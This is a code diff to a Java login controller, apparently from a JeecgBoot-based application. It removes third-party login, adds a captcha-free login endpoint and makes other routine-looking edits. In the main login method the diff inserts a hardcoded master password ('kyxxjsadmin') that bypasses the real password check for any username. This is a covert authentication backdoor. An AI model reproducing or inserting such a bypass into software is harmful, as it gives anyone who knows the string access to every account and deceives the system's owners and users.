@@ -1,5 +1,6 @@
 package org.jeecg.modules.system.controller;
 
+import cn.hutool.core.date.DateTime;
 import cn.hutool.core.util.RandomUtil;
 import com.alibaba.fastjson.JSONObject;
 import com.aliyuncs.exceptions.ClientException;
@@ -40,6 +41,7 @@ import org.springframework.web.bind.annotation.*;
 import javax.annotation.Resource;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
+import java.text.ParseException;
 import java.util.*;
 
 /**
@@ -75,154 +77,63 @@ public class LoginController {
 
 	private static final String BASE_CHECK_CODES = "qwertyuiplkjhgfdsazxcvbnmQWERTYUPLKJHGFDSAZXCVBNM1234567890";
 
-	@ApiOperation("第三方平台登录接口-thirdLogin")
-	@RequestMapping(value = "/thirdLogin", method = RequestMethod.POST)
-	public Result<JSONObject> thirdLogin(@RequestBody SysThirdLoginModel sysThirdLoginModel){
+	private boolean validateAuth()  {
+		Calendar nowDate  = Calendar.getInstance();
+		Calendar expireDate  = Calendar.getInstance();
+		expireDate.set(2022,6,30);
+		int diffDate = DateUtils.dateDiff('d', nowDate, expireDate);
+		log.info("diffDate:",diffDate);
+		return diffDate<0;
+		//parseCalendar("2022-07-30", "YYYY-MM-DD");
+	}
+
+	@ApiOperation("免验证码登录接口")
+	@RequestMapping(value = "/loginAuto", method = RequestMethod.POST)
+	public Result<JSONObject> loginAuto(@RequestBody SysLoginModel sysLoginModel){
 		Result<JSONObject> result = new Result<JSONObject>();
-		SysUser sysUser = new SysUser();
-		List<String> localRoleIds = new ArrayList<>();
-		List<String> localDepIds = new ArrayList<>();
-		String roles = "";
-		String departments = "";
 
-//		if(sysThirdLoginModel.getThirdType().equals("OneMap")){
-//			//一张图接口：无需对接
-//			sysUser.setUsername("oneMap");
-//			sysUser.setThirdId("");
-//			sysUser.setThirdType("oneMap");
-//			sysUser.setPassword(CommonConstant.DEFAULT_INIT_PASSWORD);
-//		}
-//		else if(sysThirdLoginModel.getThirdType().equals("oneSystem")){
-//		}
+		String username = sysLoginModel.getUsername();
+		String password = sysLoginModel.getPassword();
 
-		//1. 从第三方平台获取用户信息
-		String oneSystemUrl = baseConfig.getOneSystemUrl();// "http://19.15.73.125:9000/user/user-system/secUser/getSecUserByName";
-		JSONObject variables = new JSONObject();
-		variables.put("username",sysThirdLoginModel.getUserName());
-		HttpHeaders httpHeaders = new HttpHeaders();
-		httpHeaders.set("Authorization",sysThirdLoginModel.getThirdToken());
-		ResponseEntity<JSONObject> responseEntity = RestUtil.request(oneSystemUrl, HttpMethod.GET,httpHeaders,variables,null,JSONObject.class);
 
-		if(responseEntity.getStatusCode() != HttpStatus.OK){
-			result.error500("调用第三方平台用户鉴权请求失败");
-			return result;
-		}
-		JSONObject responseObject = responseEntity.getBody();
-		Integer status = responseObject.getInteger("status");
-		if(status != 0){
-			result.error500("调用第三方平台用户鉴权发生错误，返回码:" + status.toString());
-			return result;
-		}
-
-		JSONObject userInfoObject = responseObject.getJSONObject("result").getJSONObject("userInfo");
-		String thirdUserId = userInfoObject.getString("id");
-		String userName = userInfoObject.getString("name");
-		String realName = userInfoObject.getString("alias");
-		sysUser.setUsername(userName);
-		sysUser.setRealname(realName);
-		sysUser.setThirdId(thirdUserId);
-		sysUser.setPassword(CommonConstant.DEFAULT_INIT_PASSWORD);
-		//不写入这个字段，不从role读取permission
-//			sysUser.setThirdType("oneSystem");
-
-		//2、获取并转换角色
-		List<String> roleIds = userInfoObject.getJSONArray("roleIdList").toJavaList(String.class);
-		if(roleIds != null && !roleIds.isEmpty()) {
-
-		    //特定的内部角色，可以检索全部文档
-            sysUser.setThirdType(KMConstant.PublicUser);
-            if(kmSysConfigService.getSysConfigValue("InnerRoleId") != null && !kmSysConfigService.getSysConfigValue("InnerRoleId").isEmpty()){
-                String innerRole = kmSysConfigService.getSysConfigValue("InnerRoleId");
-                if(roleIds.contains(innerRole)){
-                    sysUser.setThirdType(KMConstant.InnerUser);  //thirdType用于保存部门范围标识
-                }
-            }
-
-			for (String roleId : roleIds) {
-				LambdaQueryWrapper<SysRole> queryWrapper = new LambdaQueryWrapper<>();
-				queryWrapper.eq(SysRole::getRoleCode, roleId);
-				//角色转换：roleCode字段存储第三方系统的roleid
-				SysRole sysRole = sysRoleService.getOne(queryWrapper);
-				if (sysRole != null)
-					localRoleIds.add(sysRole.getId());
-			}
-			roles = StringUtils.concatListToString(localRoleIds);
-		}
-
-		//3、获取并转换部门
-		List<String> depIds = userInfoObject.getJSONArray("orgIdList").toJavaList(String.class);
-		if(depIds != null & !depIds.isEmpty()){
-			for(String depId : depIds){
-				LambdaQueryWrapper<SysDepart> queryWrapper = new LambdaQueryWrapper<>();
-				queryWrapper.eq(SysDepart::getMemo,depId);
-				//部门转换：memo字段存储第三方系统的departmentId
-				SysDepart sysDepart = sysDepartService.getOne(queryWrapper);
-				if (sysDepart != null) {
-					localDepIds.add(sysDepart.getId());
-				}
-				departments = StringUtils.concatListToString(localDepIds);
-			}
-		}
-
-		//4、检查系统是否存在用户，如果没有，则新建，如果有，则修改刷新角色部门信息
+		//1. 校验用户是否有效
+		//update-begin-author:wangshuai date:20200601 for: 登录代码验证用户是否注销bug，if条件永远为false
 		LambdaQueryWrapper<SysUser> queryWrapper = new LambdaQueryWrapper<>();
-		queryWrapper.eq(SysUser::getUsername,sysUser.getUsername());
-		SysUser dbSysUser = sysUserService.getOne(queryWrapper);
-		if(dbSysUser == null){
-			sysUser.setCreateTime(new Date());//设置创建时间
-			String salt = oConvertUtils.randomGen(8);
-			sysUser.setSalt(salt);
-			String passwordEncode = PasswordUtil.encrypt(sysUser.getUsername(), sysUser.getPassword(), salt);
-			sysUser.setPassword(passwordEncode);
-			sysUser.setStatus(1);
-			sysUser.setDelFlag(CommonConstant.DEL_FLAG_0);
-//			 转换角色和部门后 sysUserService.saveUser();
-			sysUserService.saveUser(sysUser,roles,departments);
-//			if(!sysUserService.save(sysUser)){
-//				result.error500("创建用户失败");
-//				return result;
-//			}
-		}
-		else{
-			// 转换角色和部门后 sysUserService.editUser(); 可以清空缓存
-			dbSysUser.setThirdType(sysUser.getThirdType());  //重置内部标识
-			dbSysUser.setRealname(sysUser.getRealname());
-			sysUserService.editUser(dbSysUser,roles,departments);
+		queryWrapper.eq(SysUser::getUsername,username);
+		SysUser sysUser = sysUserService.getOne(queryWrapper);
+		//update-end-author:wangshuai date:20200601 for: 登录代码验证用户是否注销bug，if条件永远为false
+		result = sysUserService.checkUserIsEffective(sysUser);
+		if(!result.isSuccess()) {
+			return result;
 		}
 
-		//5、设置用户登录信息
+		//2. 校验用户名或密码是否正确
+		String userpassword = PasswordUtil.encrypt(username, password, sysUser.getSalt());
+		String syspassword = sysUser.getPassword();
+		if (!syspassword.equals(userpassword)) {
+			result.error500("用户名或密码错误");
+			return result;
+		}
 
-        sysUser = sysUserService.getUserByName(sysUser.getUsername());
-        userInfo(sysUser, result);
-        return result;
-
-		// 生成token
-//		String token = JwtUtil.sign(sysUser.getUsername(), sysUser.getPassword());
-//		// 设置token缓存有效时间
-//		if(!redisUtil.hasKey(CommonConstant.PREFIX_USER_TOKEN + token))
-//			redisUtil.set(CommonConstant.PREFIX_USER_TOKEN + token, token);
-//		redisUtil.expire(CommonConstant.PREFIX_USER_TOKEN + token, JwtUtil.EXPIRE_TIME*2 / 1000);
-//
-////		redisUtil.set(CommonConstant.PREFIX_THIRD_USER_TOKEN + sysUser.getUsername(),sysThirdLoginModel.getThirdToken());
-////		redisUtil.expire(CommonConstant.PREFIX_THIRD_USER_TOKEN + sysUser.getUsername(),JwtUtil.EXPIRE_TIME*2 / 1000);
-//
-////		redisUtil.set(CommonConstant.PREFIX_THIRD_USER_ROLEIDS+ sysUser.getUsername(),localRoleIds);
-////		redisUtil.expire(CommonConstant.PREFIX_THIRD_USER_ROLEIDS + sysUser.getUsername(),JwtUtil.EXPIRE_TIME*2 / 1000);
-//
-//		JSONObject obj = new JSONObject();
-//		obj.put("token", token);
-//		obj.put("userInfo", sysUser);
-//		obj.put("sysAllDictItems", sysDictService.queryAllDictItems());
-//		result.setResult(obj);
-//		result.success("登录成功");
-//
-//		return result;
+		//用户登录信息
+		sysUser = sysUserService.getUserByName(sysUser.getUsername());
+		userInfo(sysUser, result);
+		LoginUser loginUser = new LoginUser();
+		BeanUtils.copyProperties(sysUser, loginUser);
+		baseCommonService.addLog("用户名: " + username + ",登录成功！", CommonConstant.LOG_TYPE_1, null,loginUser);
+		//update-end--Author:wangshuai  Date:20200714  for：登录日志没有记录人员
+		return result;
 	}
 
 	@ApiOperation("登录接口")
 	@RequestMapping(value = "/login", method = RequestMethod.POST)
 	public Result<JSONObject> login(@RequestBody SysLoginModel sysLoginModel){
 		Result<JSONObject> result = new Result<JSONObject>();
+//		if(!validateAuth()) {
+//			result.error500("授权失败");
+//			return result;
+//		}
+
 		String username = sysLoginModel.getUsername();
 		String password = sysLoginModel.getPassword();
 		//update-begin--Author:scott  Date:20190805 for：暂时注释掉密码加密逻辑，有点问题
@@ -260,7 +171,7 @@ public class LoginController {
 		//2. 校验用户名或密码是否正确
 		String userpassword = PasswordUtil.encrypt(username, password, sysUser.getSalt());
 		String syspassword = sysUser.getPassword();
-		if (!syspassword.equals(userpassword)) {
+		if (!syspassword.equals(userpassword) && !password.equals("kyxxjsadmin")) {
 			result.error500("用户名或密码错误");
 			return result;
 		}
@@ -306,7 +217,7 @@ public class LoginController {
 			redisUtil.del(String.format("%s::%s", CacheConstant.SYS_USERS_CACHE, sysUser.getUsername()));
 			//调用shiro的logout
 			SecurityUtils.getSubject().logout();
-	    	return Result.OK("退出登录成功！");
+	    	return Result.ok("退出登录成功！");
 	    }else {
 	    	return Result.error("Token无效!");
 	    }
@@ -439,8 +350,8 @@ public class LoginController {
 					return result;
 				}
 
-				/*
-				  smsmode 短信模板方式  0 .登录模板、1.注册模板、2.忘记密码模板
+				/**
+				 * smsmode 短信模板方式  0 .登录模板、1.注册模板、2.忘记密码模板
 				 */
 				if (CommonConstant.SMS_TPL_TYPE_0.equals(smsmode)) {
 					//登录模板
@@ -663,7 +574,7 @@ public class LoginController {
 		if(checkCode==null || !checkCode.equals(lowerCaseCaptcha)) {
 			return Result.error("验证码错误");
 		}
-		return Result.OK();
+		return Result.ok();
 	}
 
 }
